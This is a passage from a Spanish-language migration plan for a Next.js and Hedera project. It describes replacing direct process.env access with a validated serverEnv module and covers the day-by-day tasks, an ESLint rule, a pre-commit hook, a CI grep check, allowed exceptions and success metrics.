- [ ] Migrar todos los `infrastructure/hedera/*.ts`
- [ ] Migrar `src/services/telegramService.ts`

### Día 3: Migración Media (Configuración)
- [ ] Migrar servicios externos (SaucerSwap, Defi)
- [ ] Migrar cache configuration
- [ ] Migrar logging configuration

### Día 4: Testing y ESLint
- [ ] Configurar ESLint rule
- [ ] Correr `pnpm lint` y fix remaining
- [ ] Testing completo

### Día 5: Verificación
- [ ] Deploy a staging
- [ ] Smoke tests completos
- [ ] Verificar logs de startup
- [ ] Code review

---

## 🛡️ Prevención Futura

### 1. ESLint Configuration

```javascript
// .eslintrc.js o eslint.config.mjs
{
    rules: {
        'no-restricted-syntax': [
            'error',
            {
                selector: "MemberExpression[object.name='process'][property.name='env']",
                message: 'Use serverEnv instead of process.env'
            }
        ]
    }
}
```

### 2. Pre-commit Hook

```json
// package.json
{
    "lint-staged": {
        "*.{ts,tsx}": [
            "eslint --fix",
            "bash -c 'if git diff --cached --name-only | xargs grep -l \"process\\.env\" | grep -v \"serverEnv.ts\\|env-validator\"; then echo \"ERROR: Found process.env usage\"; exit 1; fi'"
        ]
    }
}
```

### 3. CI/CD Check

```yaml
# .github/workflows/ci.yml
- name: Check for direct env access
  run: |
    if grep -r "process\.env" src/ \
       --exclude="serverEnv.ts" \
       --exclude="env-validator.ts" \
       --include="*.ts" \
       --include="*.tsx"; then
      echo "ERROR: Direct process.env access found"
      exit 1
    fi
```

---

## 🎯 Casos de Borde y Excepciones

### Excepciones Legítimas

Estos archivos **PUEDEN** acceder a `process.env`:

1. **`src/config/serverEnv.ts`** - Única fuente de verdad
2. **`src/lib/env-validator.ts`** - Utilidad de validación
3. **`next.config.ts`** - Configuración de Next.js (build time)
4. **`sentry.*.config.ts`** - Configuración de Sentry (build time)
5. **`instrumentation.ts`** - Inicialización temprana

### Variables del Cliente (NEXT_PUBLIC_*)

```typescript
// ✅ PERMITIDO en componentes de React
const projectId = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID

// Razón: Estas se reemplazan en build time por Next.js
// No son secretos, son públicas por diseño
```

**Pero mejor:**
```typescript
// src/config/clientEnv.ts
export const clientEnv = {
    walletConnect: {
        projectId: process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID!,
    },
    supabase: {
        url: process.env.NEXT_PUBLIC_SUPABASE_URL!,
        anonKey: process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    },
    app: {
        url: process.env.NEXT_PUBLIC_APP_URL!,
    },
}

// En componentes
import { clientEnv } from '@/config/clientEnv'
const projectId = clientEnv.walletConnect.projectId
```

---

## 📊 Métricas de Éxito

### Antes de la Migración
- ❌ 150+ accesos directos a `process.env`
- ❌ 44 archivos afectados
- ❌ Sin validación en startup
- ❌ Sin type safety
- ❌ Crashes en runtime

### Después de la Migración
- ✅ 0 accesos directos (excepto archivos de config)
- ✅ Validación completa en startup
- ✅ Type safety al 100%
- ✅ Fail fast (no crashes en runtime)
- ✅ ESLint previene regresiones
- ✅ CI/CD checks automáticos

---

## 🔗 Referencias

- [Zod Documentation](https://zod.dev/)
- [Next.js Environment Variables](https://nextjs.org/docs/app/building-your-application/configuring/environment-variables)
- [12 Factor App - Config](https://12factor.net/config)
- [OWASP - Secure Configuration](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html)

---

**Último Update:** 2025-10-30
**Estado:** Pendiente de implementación
**Prioridad:** 🔴 CRÍTICA - Semana 1
